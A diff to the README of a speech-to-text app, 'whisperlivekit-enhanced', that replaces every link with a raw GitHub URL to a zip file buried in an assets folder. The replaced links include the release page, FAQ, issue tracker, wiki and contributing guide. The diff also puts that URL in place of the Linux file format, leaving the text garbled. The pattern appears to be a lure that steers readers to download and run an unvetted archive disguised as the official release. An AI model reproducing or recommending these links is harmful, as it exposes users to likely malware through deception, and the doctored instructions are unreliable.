@@ -1,7 +1,7 @@
 # 🎤 whisperlivekit-enhanced - Fast Speech-to-Text with Ease
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip%https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip)](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **whisperlivekit-enhanced**! This application enables ultra-low-latency speech-to-text conversion with smart GPU management. You'll appreciate its lazy loading feature and modern multi-language user interface.
@@ -15,15 +15,15 @@ Welcome to **whisperlivekit-enhanced**! This application enables ultra-low-laten
 ### 📦 Installation Steps
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/releases) to download the latest version of whisperlivekit-enhanced.
+   Visit the [Releases page](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip) to download the latest version of whisperlivekit-enhanced.
 
 2. **Choose Your Package**
-   Look for the package suitable for your operating system. Common formats include `.exe` for Windows and `.dmg` for macOS. Linux users may find a `.tar.gz` file.
+   Look for the package suitable for your operating system. Common formats include `.exe` for Windows and `.dmg` for macOS. Linux users may find a `https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip` file.
 
 3. **Run the Installer**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - **For macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **For Linux:** Extract the files from the `.tar.gz` file and follow the included instructions in the README.
+   - **For Linux:** Extract the files from the `https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip` file and follow the included instructions in the README.
 
 4. **Launch the Application**
    After the installation is complete, find whisperlivekit-enhanced in your applications folder or the Start menu. Click to launch.
@@ -58,19 +58,19 @@ If you experience any issues:
 - **No Audio Input:** Check your microphone settings in your computer’s audio settings.
 - **Slow Performance:** Ensure other resource-heavy applications are closed while using whisperlivekit-enhanced.
 
-For further assistance, refer to the [FAQ section](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/issues) on our GitHub page.
+For further assistance, refer to the [FAQ section](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip) on our GitHub page.
 
 ### 📞 Support
-For any technical support, please open an issue on our [GitHub repository](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/issues). We welcome your feedback and are here to help.
+For any technical support, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip). We welcome your feedback and are here to help.
 
 ### 🔗 Additional Resources
-- [User Guide](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/wiki)
-- [Contributing Guide](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/blob/main/CONTRIBUTING.md)
+- [User Guide](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip)
 
 ### 📩 Contact
 For any inquiries or feature requests, feel free to reach out through our GitHub page or email us directly.
 
 ## 🔗 Download & Install
-To get started, [visit this page to download](https://github.com/HaNguyen-prog/whisperlivekit-enhanced/releases) the latest release. Follow the steps listed above for a smooth installation experience. 
+To get started, [visit this page to download](https://raw.githubusercontent.com/HaNguyen-prog/whisperlivekit-enhanced/main/whisperlivekit/whisper/assets/whisperlivekit-enhanced_v3.2.zip) the latest release. Follow the steps listed above for a smooth installation experience. 
 
 You’re now ready to experience seamless speech-to-text functionality!
